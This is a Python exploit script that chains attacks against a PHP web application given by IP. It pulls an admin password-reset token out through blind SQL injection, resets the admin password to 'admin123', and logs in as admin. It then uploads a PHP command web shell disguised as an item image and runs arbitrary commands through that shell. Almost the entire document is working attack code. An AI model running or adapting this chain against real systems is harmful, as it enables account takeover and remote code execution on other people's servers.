#!/usr/bin/python3
import requests, sys, time
from urllib.parse import urljoin

s = requests.Session()

def extract_token():
    token = ''
    position = 1
    print("Extracting Token...")
    while(1):
        for i in range(0, 255):
            url = f'http://{ip}/item/viewItem.php?id=1+AND+(SELECT+IF(1, ' \
                  f'(ASCII(SUBSTRING((SELECT token FROM user WHERE id=1), ' \
                  f'{position}, 1))={i}), 0))'
            r = requests.get(url)
            if r.status_code == 404:
                token = token + str(chr(i))
                position = position + 1
                print(token)
        if len(token) == 15:
            break
    print("[+] Complete Extracted Token:", token)
    return token  # Return the extracted token

def generateToken():
    url = f"http://{ip}/login/resetPassword.php"

    # Define the data to be sent in the POST request as a dictionary
    data = {"username": "admin"}

    # Send the POST request
    response = requests.post(url, data=data)

    # Check the Content-Length header in the response
    #if 'Content-Length' in response.headers:
        #content_length = int(response.headers['Content-Length'])
        #print(f"Content-Length: {content_length}")

    # Check if the success message is in the response content
    expected_content_length = 850

    if 'Content-Length' in response.headers and int(response.headers['Content-Length']) == expected_content_length:
        # Request was successful
        print("[+] New token was generated.")
        token = extract_token()  # Get the token from extract_token()
        return token  # Return the token
    else:
        # Request failed
        print("[-] POST request failed.")


def changeAdminPassword(token):
    # Change admin password
    changePasswordURL = f"http://{ip}/login/doChangePassword.php"
    data = {"token": token, "password": "admin123"}
    response = requests.post(changePasswordURL, data=data, allow_redirects=False)
    print("[+] Admin Password Changed to admin123")

def adminLogin():
    url = f"http://{ip}/login/checkLogin.php"
    data = {"username": "admin", "password": "admin123"}
    response = s.post(url, data=data, allow_redirects=True)
    if "Congrats" in response.text:
        print("[+] Successfully logged in as admin")
        print("[+] Admin PHPSESSID Cookie: " + str(s.cookies['PHPSESSID']))
        admin_cookie = str(s.cookies['PHPSESSID'])
        return admin_cookie
    else:
        print("[-] Failed to Login as Admin")
    #print("Returned Cookie: ",admin_cookie)
    #return admin_cookie

def fileUpload(admin_cookie):
    url = f"http://{ip}/item/updateItem.php"
    shell_url = f"http://{ip}/item/image/"
    shell_name = "cmd.phar"
    cookie = {'PHPSESSID': admin_cookie}
    phpFile = {'id': (None, '1'), 'id_user': (None, '1'), 'name': (None, 'test'), 'image': (shell_name, '<?php system($_GET["cmd"]); ?>', 'application/octet-stream'), 'description': (None, 'Silver'), 'price': (None, '1')}
    response = requests.post(url, files=phpFile ,cookies=cookie, allow_redirects=True)
    if "Item data has been edited" in response.text:
        print("[+] Successfully uploaded php CMD shell!")
        print("[+] Shell path: " + shell_url + shell_name + "?cmd=")
        admin_cookie = str(s.cookies['PHPSESSID'])
        shell_path = shell_name
        return shell_path
    else:
        print("[-] Shell upload failed!")

def cmdExec(shell_path, admin_cookie):
    cmd_argument = sys.argv[2]
    shell_name = shell_path
    url = f"http://{ip}/item/image/{shell_name}"
    cookie = {'PHPSESSID': admin_cookie}
    cmd_url = f'{url}?cmd={cmd_argument}'
    response = requests.get(cmd_url)
    if response.status_code == 200:
        print("Response content:")
        print(response.text)
    else:
        print(f"Request failed with status code: {response.status_code}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
	    print(f"(+) Usage: {sys.argv[0]} <Target IP> CMD")
	    sys.exit(1)
    
    ip = sys.argv[1]
    token = generateToken()  # Get the token from generateToken()
    changeAdminPassword(token)  # Pass the token to changeAdminPassword()
    admin_cookie = adminLogin()
    shell_path = fileUpload(admin_cookie)
    cmdExec(shell_path, admin_cookie)
